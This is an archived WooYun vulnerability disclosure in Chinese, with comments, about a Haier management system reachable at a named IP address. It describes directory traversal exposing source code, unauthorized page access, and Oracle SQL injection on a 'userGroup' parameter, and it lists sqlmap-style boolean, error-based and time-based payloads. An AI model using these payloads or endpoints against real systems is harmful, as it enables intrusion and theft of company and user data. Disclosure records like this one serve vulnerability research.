{"id": 8422, "wybug_id": "wooyun-2013-037745", "wybug_title": "海尔某重要管理系统问题打包(sql注入、未授权访问、目录遍历)", "wybug_corp": "海尔集团", "wybug_author": "霍大然", "wybug_date": "2013-09-22 09:14", "wybug_open_date": "2013-11-06 09:14", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["目录遍历", "注入", "信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-10-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-10-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-11-06：\t细节向公众公开  简要描述： sql注入问题导致各地公司信息泄露(数据量比较大)、配置不当导致未授权访问及目录遍历泄露等问题。 详细说明：  问题站点：http://58.56.128.17:8888/可以看到所有的信息都应该通过登录看到\n\n一、目录遍历导致源码泄露http://58.56.128.17:8888/public/看到money眼前一亮\n\n源码出来了：\n\nhttp://58.56.128.17:8888/project/bak/com/neukingstone/common/里也有java的源码http://58.56.128.17:8888/common/二、未授权访问http://58.56.128.17:8888/common/deptduty.jsp随便选一个，组织机构列表出来了\n\n看到下个链接发现他们的系统是东软做的：http://58.56.128.17:8888/project/bak/com/neukingstone/http://58.56.128.17:8888/project/bak/com/neukingstone/util/DAO.java~1~发现下面的链接可以简单操作：http://58.56.128.17:8888/common/selmultiman.jsp\n\n三、sql注入问题注入点：http://58.56.128.17:8888/common/selmultiman.jsp?userGroup=2Place: GETParameter: userGroup    Type: boolean-based blind    Title: Oracle boolean-based blind - Parameter replace (original value)    Payload: userGroup=(SELECT (CASE WHEN (9954=9954) THEN 2 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: userGroup=2 AND 5249=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(115)||CHR(105)||CHR(103)||CHR(113)||(SELECT (CASE WHEN (5249=5249) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(108)||CHR(106)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL)    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: userGroup=2 AND 6397=DBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(113)||CHR(76)||CHR(116),5)---web application technology: JSPback-end DBMS: Oracle\n\n共310个表\n\n某用户表：\n\n   漏洞证明：  看到一个money表，一看5000多条信息\n\n密码历史的记录，有3385条，可见用户真不少：\n\n   修复方案：  让东软补去吧，配置要自己配置   版权声明：转载请注明来源 霍大然@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-09-25 09:17 厂商回复： 首先感谢 @霍大然 的工作。同一个业务单位，同样回复为老系统，正在联系技术人员处理，还未有正式的解决方案。请各位白帽子持续友好监督海尔信息安全工作，非常感谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-22 10:16 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  @xsser 我发的洞要审核多久    \n     2013-09-22 10:17 |    \t\t霍大然 \t\t\t( 普通白帽子  |\t\t\t        Rank:1136 漏洞数:178        | W币花完了，刷分还是不刷？)\t\t \n  我发的海尔的也有没审核的    \n     2013-09-22 10:52 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @霍大然 告诉我。管理员是不是你亲戚。为啥你的洞审核这么快    \n     2013-09-22 12:48 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @finger @疯狗    \n     2013-09-22 13:07 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  @疯狗 什么时候审核我提交的洞洞啊    \n     2013-09-22 14:04 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  @霍大然 @Mas 不好意思  胃病犯了 上午去医院看了下 开了点儿药 已审核 要审核的漏洞确实很多  请见谅    \n     2013-09-22 14:09 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  @寂寞的瘦子 @霍大然 @Mas 请大家提交漏洞  尽量内容完整 手机上审的 不太好复现  内容不全面的  等会儿到家再审    \n     2013-09-22 14:12 |    \t\t霍大然 \t\t\t( 普通白帽子  |\t\t\t        Rank:1136 漏洞数:178        | W币花完了，刷分还是不刷？)\t\t \n  @Finger 保重身体吧，我们都是来玩的，身体是最重要的。    \n     2013-09-22 14:18 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @Finger 对对对。身体最重要    \n     2013-09-22 14:22 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  @寂寞的瘦子 @霍大然 没事儿  老毛病了  自己也总忘记吃东西要注意    \n     2013-09-22 14:30 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Finger 啥都没有的直接pass吧    \n     2013-09-22 14:38 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  @Finger 保重    \n     2013-09-25 13:25 |    \t\t霍大然 \t\t\t( 普通白帽子  |\t\t\t        Rank:1136 漏洞数:178        | W币花完了，刷分还是不刷？)\t\t \n  给我的全是20，感谢厂商！    \n     2013-09-25 14:00 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @霍大然 你发了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}